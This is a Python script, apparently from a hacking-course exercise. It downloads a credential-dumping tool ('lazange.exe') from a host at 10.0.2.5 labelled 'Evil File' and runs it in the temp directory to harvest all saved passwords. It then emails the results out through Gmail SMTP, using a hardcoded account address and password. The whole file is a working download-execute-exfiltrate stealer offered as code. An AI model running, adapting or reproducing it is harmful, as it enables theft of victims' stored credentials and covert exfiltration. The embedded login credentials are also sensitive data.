#!/usr/bin/env python
import requests #library that allow to send request on the internet
import subprocess #module that allow us to able to execute commands throgh the program
import smtplib #library that allow to send emails from our code
import os #cross platform, allow to run OS tasks
import tempfile #cross platform
def dowanload(url): #cross platform url is the link that this function will download
    get_response = requests.get(url) #return all content
    file_name = url.split("/")[-1] #to split according /
    with open(file_name, "wb") as out_file: #with dealing with file then open it and write on it and b for the binary file
        out_file.write(get_response.content) #execute while the file open

def send_mail(email,password,message): #cross platform
    server = smtplib.SMTP("smtp.gmail.com", 587 ) #create server instant, google becuse allow us to send emails , 587 port , we can use this to send the email
    server.starttls()#tls connection using the server
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
dowanload("http://10.0.2.5/Evil File/lazange.exe")
result = subprocess.check_output("lazange.exe all", shell=True) #cross platform
send_mail("learningrth0@gmail.com", "metallica@#$0123456789", result)
#os.remove("Slogger")
